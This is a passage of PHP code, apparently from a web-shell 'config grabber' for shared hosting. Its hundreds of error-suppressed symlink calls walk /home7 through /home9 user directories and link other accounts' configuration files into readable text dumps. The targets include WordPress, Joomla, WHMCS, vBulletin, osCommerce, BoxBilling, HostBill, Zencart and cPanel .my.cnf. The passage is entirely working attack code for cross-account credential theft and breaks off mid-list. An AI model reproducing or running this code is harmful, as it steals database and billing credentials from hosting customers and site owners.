    @symlink('/home7/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home7/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

    //home 8 

    @symlink('/home8/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home8/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home8/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home8/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home8/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home8/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home8/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

    //home 9 

    @symlink('/home9/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home9/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home9/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home9/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home9/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home9/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home9/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
